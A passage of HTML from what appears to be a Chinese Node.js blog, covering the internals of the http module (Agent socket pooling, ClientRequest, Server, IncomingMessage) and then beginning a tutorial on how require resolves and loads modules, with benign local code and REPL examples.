class="attr">port</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">  req.on(<span class="string">'response'</span>, (res) =&gt; &#123;</span><br><span class="line">    res.on(<span class="string">'data'</span>, (chunk) =&gt; <span class="built_in">console</span>.log(<span class="string">'data from server '</span>, chunk.toString()) );</span><br><span class="line">    res.on(<span class="string">'end'</span>, () =&gt; server.close() );</span><br><span class="line">  &#125;);</span><br><span class="line">  req.end();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 输出结果如下:</span></span><br><span class="line"><span class="comment">// server is on  &#123; address: '::', family: 'IPv6', port: 3000 &#125;</span></span><br><span class="line"><span class="comment">// data from server  &lt;!doctype&gt;</span></span><br><span class="line"><span class="comment">// data from server  &lt;html&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>针对上述demo，有很多值得深究的地方，一不注意服务就挂掉了，下面根据node的<a href="https://nodejs.org/api/http.html" target="_blank" rel="noopener">官方文档</a>，逐个进行研究。</p>
<h3 id="6-1-http-Agent"><a href="#6-1-http-Agent" class="headerlink" title="6.1 http.Agent"></a>6.1 http.Agent</h3><p>因为HTTP协议是无状态协议，每个请求均需通过三次握手建立连接进行通信，众所周知三次握手、慢启动算法、四次挥手等过程很消耗时间，因此HTTP1.1协议引入了keep-alive来避免频繁的连接。那么对于tcp连接该如何管理呢？http.Agent就是做这个工作的。先看看源码中的关键部分:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Agent</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  EventEmitter.call(<span class="keyword">this</span>);</span><br><span class="line">  ...</span><br><span class="line">  self.maxSockets = self.options.maxSockets || Agent.defaultMaxSockets;</span><br><span class="line">  self.maxFreeSockets = self.options.maxFreeSockets || <span class="number">256</span>;</span><br><span class="line">  ...</span><br><span class="line">  self.requests = &#123;&#125;; <span class="comment">// 请求队列</span></span><br><span class="line">  self.sockets = &#123;&#125;; <span class="comment">// 正在使用的tcp连接池</span></span><br><span class="line">  self.freeSockets = &#123;&#125;; <span class="comment">// 空闲的连接池</span></span><br><span class="line">  self.on(<span class="string">'free'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">socket, options</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// requests、sockets、freeSockets的读写操作</span></span><br><span class="line">    self.requests[name].shift().onSocket(socket);</span><br><span class="line">    freeSockets.push(socket);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Agent.defaultMaxSockets = <span class="literal">Infinity</span>;</span><br><span class="line">util.inherits(Agent, EventEmitter);</span><br><span class="line"><span class="comment">// 关于socket的相关增删改查操作</span></span><br><span class="line">Agent.prototype.addRequest = <span class="function"><span class="keyword">function</span>(<span class="params">req, options</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (freeLen) &#123;</span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">this</span>.freeSockets[name].shift();</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">this</span>.sockets[name].push(socket);</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sockLen &lt; <span class="keyword">this</span>.maxSockets) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.requests[name].push(req);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">Agent.prototype.createSocket = <span class="function"><span class="keyword">function</span>(<span class="params">req, options, cb</span>) </span>&#123; ... &#125;</span><br><span class="line">Agent.prototype.removeSocket = <span class="function"><span class="keyword">function</span>(<span class="params">s, options</span>) </span>&#123; ... &#125;</span><br><span class="line">exports.globalAgent = <span class="keyword">new</span> Agent();</span><br></pre></td></tr></table></figure>
<p>上述代码有几个点需要注意:</p>
<ul>
<li>maxSockets默认情况下，没有tcp连接数量的上限(Infinity)</li>
<li>连接池管理的核心是对<code>sockets</code>、<code>freeSockets</code>的增删查</li>
<li>globalAgent会作为http.ClientRequest的默认agent</li>
</ul>
<p>下面可以测试下agent对请求本身的限制:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// req.js</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    res.end(<span class="string">'ok '</span>, i++);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">var</span> max = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;max; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> req = http.request(&#123; <span class="attr">host</span>: <span class="string">'127.0.0.1'</span>, <span class="attr">port</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    req.on(<span class="string">'response'</span>, (res) =&gt; &#123;</span><br><span class="line">      res.on(<span class="string">'data'</span>, (chunk) =&gt; <span class="built_in">console</span>.log(<span class="string">'data from server '</span>, chunk.toString()) );</span><br><span class="line">      res.on(<span class="string">'end'</span>, () =&gt; server.close() );</span><br><span class="line">    &#125;);</span><br><span class="line">    req.end();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 在终端中执行time node ./req.js，结果为:</span></span><br><span class="line"><span class="comment">// real  0m1.123s</span></span><br><span class="line"><span class="comment">// user  0m0.102s</span></span><br><span class="line"><span class="comment">// sys 0m0.024s</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在req.js中添加下面代码</span></span><br><span class="line">http.globalAgent.maxSockets = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// 然后同样time node ./req.js，结果为:</span></span><br><span class="line">real  <span class="number">0</span>m4<span class="number">.141</span>s</span><br><span class="line">user  <span class="number">0</span>m0<span class="number">.103</span>s</span><br><span class="line">sys <span class="number">0</span>m0<span class="number">.024</span>s</span><br></pre></td></tr></table></figure>
<p>当设置maxSockets为某个值时，tcp的连接就会被限制在某个值，剩余的请求就会进入<code>requests</code>队列里面，等有空余的socket连接后，从request队列中出栈，发送请求。</p>
<h3 id="6-2-http-ClientRequest"><a href="#6-2-http-ClientRequest" class="headerlink" title="6.2 http.ClientRequest"></a>6.2 http.ClientRequest</h3><p>当执行http.request时，会生成ClientRequest对象，该对象虽然没有直接继承Stream.Writable，但是继承了http.OutgoingMessage，而http.OutgoingMessage实现了write、end方法，因为可以当跟stream.Writable一样的使用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = http.request(&#123; <span class="attr">host</span>: <span class="string">'127.0.0.1'</span>, <span class="attr">port</span>: <span class="number">3000</span>, <span class="attr">method</span>: <span class="string">'post'</span>&#125;);</span><br><span class="line">req.on(<span class="string">'response'</span>, (res) =&gt; &#123;</span><br><span class="line">  res.on(<span class="string">'data'</span>, (chunk) =&gt; <span class="built_in">console</span>.log(<span class="string">'data from server '</span>, chunk.toString()) );</span><br><span class="line">  res.on(<span class="string">'end'</span>, () =&gt; server.close() );</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 直接使用pipe，在request请求中添加数据</span></span><br><span class="line">fs.createReadStream(<span class="string">'./data.json'</span>).pipe(req);</span><br></pre></td></tr></table></figure>
<p>接下来，看看http.ClientRequest的实现, ClientRequest继承了OutgoingMessage:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> OutgoingMessage = <span class="built_in">require</span>(<span class="string">'_http_outgoing'</span>).OutgoingMessage;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ClientRequest</span>(<span class="params">options, cb</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  OutgoingMessage.call(self);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(ClientRequest, OutgoingMessage);</span><br></pre></td></tr></table></figure>
<h3 id="6-3-http-Server"><a href="#6-3-http-Server" class="headerlink" title="6.3 http.Server"></a>6.3 http.Server</h3><p>http.createServer其实就是创建了一个http.Server对象，关键源码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exports.createServer = <span class="function"><span class="keyword">function</span>(<span class="params">requestListener</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Server(requestListener);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Server</span>(<span class="params">requestListener</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  net.Server.call(<span class="keyword">this</span>, &#123; <span class="attr">allowHalfOpen</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (requestListener) &#123;</span><br><span class="line">    <span class="keyword">this</span>.addListener(<span class="string">'request'</span>, requestListener);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">this</span>.addListener(<span class="string">'connection'</span>, connectionListener);</span><br><span class="line">  <span class="keyword">this</span>.timeout = <span class="number">2</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Server, net.Server);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connectionListener</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  socket.on(<span class="string">'end'</span>, socketOnEnd);</span><br><span class="line">  socket.on(<span class="string">'data'</span>, socketOnData)</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有几个需要要关注的点:</p>
<ul>
<li>服务的创建依赖于net.server，通过net.server在底层实现服务的创建</li>
<li>默认情况下，服务的超时时间为2分钟</li>
<li>connectionListener处理tcp连接后的行为，跟net保持一致</li>
</ul>
<h3 id="6-4-http-ServerResponse"><a href="#6-4-http-ServerResponse" class="headerlink" title="6.4 http.ServerResponse"></a>6.4 http.ServerResponse</h3><p>看node.org官方是如何介绍server端的response对象的:</p>
<p>This object is created internally by an HTTP server–not by the user. It is passed as the second parameter to the ‘request’ event.</p>
<p>The response implements, but does not inherit from, the Writable Stream interface.</p>
<p>跟http.ClientRequest很像，继承了OutgoingMessage，没有继承Stream.Writable，但是实现了Stream的功能，可以跟Stream.Writable一样灵活使用:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ServerResponse</span>(<span class="params">req</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  OutgoingMessage.call(<span class="keyword">this</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(ServerResponse, OutgoingMessage);</span><br></pre></td></tr></table></figure>
<h3 id="6-5-http-IncomingMessage"><a href="#6-5-http-IncomingMessage" class="headerlink" title="6.5 http.IncomingMessage"></a>6.5 http.IncomingMessage</h3><p>An IncomingMessage object is created by http.Server or http.ClientRequest and passed as the first argument to the ‘request’ and ‘response’ event respectively. It may be used to access response status, headers and data.</p>
<p>http.IncomingMessage有两个地方时被内部创建，一个是作为server端的request，另外一个是作为client请求中的response，同时该类显示地继承了Stream.Readable。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IncomingMessage</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  Stream.Readable.call(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>.socket = socket;</span><br><span class="line">  <span class="keyword">this</span>.connection = socket;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(IncomingMessage, Stream.Readable);</span><br></pre></td></tr></table></figure>
<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="http://zhenhua-lee.github.io/node/socket.html" target="_blank" rel="noopener">http://zhenhua-lee.github.io/node/socket.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/08/08/Node.js/网络—node中的网络通信模块/" data-id="cjujf4p4h005fcp6f0uqa1z29" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Node-js/">Node.js</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Node.js/模块—你需要了解的Node.js模块" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/05/Node.js/模块—你需要了解的Node.js模块/" class="article-date">
  <time datetime="2017-06-05T06:45:23.000Z" itemprop="datePublished">2017-06-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/05/Node.js/模块—你需要了解的Node.js模块/">模块—你需要了解的Node.js 模块</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Node 使用两个核心模块来管理模块依赖：</p>
<ul>
<li>require 模块，在全局范围可用——无需 require(‘require’)。</li>
<li>module 模块，在全局范围可用——无需 require(‘module’)。</li>
</ul>
<p>你可以将 require 模块视为命令，将 module 模块视为所有必需模块的组织者。<br>在 Node 中获取一个模块并不复杂。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'/path/to/file'</span>);</span><br></pre></td></tr></table></figure>
<p>由 require 模块导出的主要对象是一个函数（如上例所用）。 当 Node 使用本地文件路径作为函数的唯一参数调用该 require() 函数时，Node 将执行以下步骤：</p>
<ul>
<li><strong>解析</strong>：找到文件的绝对路径。</li>
<li><strong>加载</strong>：确定文件内容的类型.</li>
<li><strong>封装</strong>：给文件其私有作用域。 这使得 require 和 module 对象两者都可以下载我们需要的每个文件。</li>
<li><strong>评估</strong>：这是 VM 对加载的代码最后需要做的。</li>
<li><strong>缓存</strong>：当我们再次需要这个文件时，不再重复所有的步骤。</li>
</ul>
<p>在本文中，我将尝试用示例解释这些不同的阶段，以及它们是如何影响我们在 Node 中编写模块的方式的。</p>
<p>先在终端创建一个目录来保存所有示例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/learn-node &amp;&amp; cd ~/learn-node</span><br></pre></td></tr></table></figure></p>
<p>本文之后所有命令都在 ~/learn-node 下运行。</p>
<h4 id="解析本地路径"><a href="#解析本地路径" class="headerlink" title="解析本地路径"></a>解析本地路径</h4><p>我现在向你介绍 module 对象。你可以在一个的 REPL(译者注：Read-Eval-Print-Loop，就是一般控制台干的事情)会话中很容易地看到它：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> module</span><br><span class="line">Module &#123;</span><br><span class="line">  id: '&lt;repl&gt;',</span><br><span class="line">  exports: &#123;&#125;,</span><br><span class="line">  parent: undefined,</span><br><span class="line">  filename: null,</span><br><span class="line">  loaded: false,</span><br><span class="line">  children: [],</span><br><span class="line">  paths: [ ... ] &#125;</span><br></pre></td></tr></table></figure></p>
<p>每个模块对象都有一个 id 属性作为标识。这个 id 通常是文件的完整路径，不过在 REPL 会话中，它只是 <repl>。</repl></p>
<p>Node 模块与文件系统有着一对一的关系。请求模块就是把文件内容加载到内存中。</p>
<p>不过，因为 Node 中有很多方法用于请求文件(比如，使用相对路径，或预定义的路径)，在我们把文件内容加载到内存之前，我们需要找到文件的绝对位置。<br>现在请求 ‘find-me’ 模块，但不指定路径：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'find-me'</span>);</span><br></pre></td></tr></table></figure></p>
<p>Node 会按顺序在 module.paths 指定的路径中去寻找 find-me.js。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> module.paths</span><br><span class="line">[ '/Users/samer/learn-node/repl/node_modules',</span><br><span class="line">  '/Users/samer/learn-node/node_modules',</span><br><span class="line">  '/Users/samer/node_modules',</span><br><span class="line">  '/Users/node_modules',</span><br><span class="line">  '/node_modules',</span><br><span class="line">  '/Users/samer/.node_modules',</span><br><span class="line">  '/Users/samer/.node_libraries',</span><br><span class="line">  '/usr/local/Cellar/node/7.7.1/lib/node' ]</span><br></pre></td></tr></table></figure></p>
<p>路径列表基本上会是从当前目录到根目录下的每一个 node_modules 目录。它也会包含一些不推荐使用的遗留目录。</p>
<p>如果 Node 在这些目录下仍然找不到 find-me.js，它会抛出 “cannot find module error.(不能找到模块)” 这个错误消息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me')</span><br><span class="line">Error: Cannot find module 'find-me'</span><br><span class="line">    at Function.Module._resolveFilename (module.js:470:15)</span><br><span class="line">    at Function.Module._load (module.js:418:25)</span><br><span class="line">    at Module.require (module.js:498:17)</span><br><span class="line">    at require (internal/module.js:20:19)</span><br><span class="line">    at repl:1:1</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:23:33)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:336:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br><span class="line">    at REPLServer.onLine (repl.js:533:10)</span><br></pre></td></tr></table></figure>
<p>现在创建一个局部的 node_modules 目录，放入一个 find-me.js，require(‘find-me’) 就能找到它。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ mkdir node_modules </span><br><span class="line">~/learn-node $ echo "console.log('I am not lost');" &gt; node_modules/find-me.js</span><br><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me');</span><br><span class="line">I am not lost</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果别的路径下存在另一个 find-me.js 文件，例如在 home 目录下存在 node_modules 目录，其中有一个不同的 find-me.js：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> mkdir ~/node_modules</span><br><span class="line"><span class="meta">$</span> echo "console.log('I am the root of all problems');" &gt; ~/node_modules/find-me.js</span><br></pre></td></tr></table></figure>
<p>现在 learn-node 目录也包含 node_modules/find-me.js —— 在这个目录下 require(‘find-me’)，那么 home 目录下的 find-me.js 根本不会被加载：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me')</span><br><span class="line">I am not lost</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果删除了~/learn-node 目录下的的 node_modules 目录，再次尝试请求 find-me.js，就会使用 home 目录下 node_modules 目录中的 find-me.js 了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ rm -r node_modules/</span><br><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me')</span><br><span class="line">I am the root of all problems</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="请求一个目录"><a href="#请求一个目录" class="headerlink" title="请求一个目录"></a>请求一个目录</h4><p>模块不一定是文件。我们也可以在 node_modules 目录下创建一个 find-me 目录，并在其中放一个 index.js 文件。同样的 require(‘find-me’) 会使用这个目录下的 index.js 文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ mkdir -p node_modules/find-me</span><br><span class="line">~/learn-node $ echo "console.log('Found again.');" &gt; node_modules/find-me/index.js</span><br><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me');</span><br><span class="line">Found again.</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意如果存在局部模块，home 下 node_modules 路径中的相应模块仍然会被忽略。</p>
<p>在请求一个目录的时候，默认会使用 index.js，不过我们可以通过 package.json 中的 main 选项来改变起始文件。比如，希望 require(‘find-me’) 在 find-me 目录下去使用另一个文件，只需要在那个目录下添加  package.json 文件来完成这个事情：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ echo "console.log('I rule');" &gt; node_modules/find-me/start.js</span><br><span class="line">~/learn-node $ echo '&#123; "name": "find-me-folder", "main": "start.js" &#125;' &gt; node_modules/find-me/package.json</span><br><span class="line">~/learn-node $ node</span><br><span class="line"><span class="meta">&gt;</span> require('find-me');</span><br><span class="line">I rule</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="require-resolve"><a href="#require-resolve" class="headerlink" title="require.resolve"></a>require.resolve</h4><p>如果你只是想找到模块，并不想执行它，你可以使用 require.resolve 函数。除了不加载文件，它的行为与主函数 require 完全相同。如果文件不存在它会抛出错误，如果找到了指定的文件，它会返回完整路径。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> require.resolve('find-me');</span><br><span class="line">'/Users/samer/learn-node/node_modules/find-me/start.js'</span><br><span class="line"><span class="meta">&gt;</span> require.resolve('not-there');</span><br><span class="line">Error: Cannot find module 'not-there'</span><br><span class="line">    at Function.Module._resolveFilename (module.js:470:15)</span><br><span class="line">    at Function.resolve (internal/module.js:27:19)</span><br><span class="line">    at repl:1:9</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:23:33)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:336:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br><span class="line">    at REPLServer.onLine (repl.js:533:10)</span><br><span class="line">    at emitOne (events.js:101:20)</span><br><span class="line">    at REPLServer.emit (events.js:191:7)</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
<p>这很有用，比如，检查一个可选的包是否安装并在它已安装的情况下使用它。</p>
<h4 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h4><p>除了在 node_modules 目录中查找模块之外，我们也可以把模块放置于任何位置，然后通过相对路径(./ 和 ../)请求，也可以通过以 / 开始的绝对路径请求。</p>
<p>比如，如果 find-me.js 是放在 lib 目录而不是 node_modules 目录下，可以这样请求：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./lib/find-me'</span>);</span><br></pre></td></tr></table></figure>
<h4 id="文件中的父子关系"><a href="#文件中的父子关系" class="headerlink" title="文件中的父子关系"></a>文件中的父子关系</h4><p>创建 lib/util.js 文件并添加一行 console.log 代码来识别它。console.log 会输出模块自身的 module 对象：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ mkdir lib</span><br><span class="line">~/learn-node $ echo "console.log('In util', module);" &gt; lib/util.js</span><br></pre></td></tr></table></figure>
<p>在 index.js 文件中干同样的事情，稍后我们会通过 node 命令执行这个文件。让 index.js 文件请求 lib/util.js： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ echo "console.log('In index', module); require('./lib/util');" &gt; index.js</span><br></pre></td></tr></table></figure>
<p>现在用 node 执行 index.js：</p>
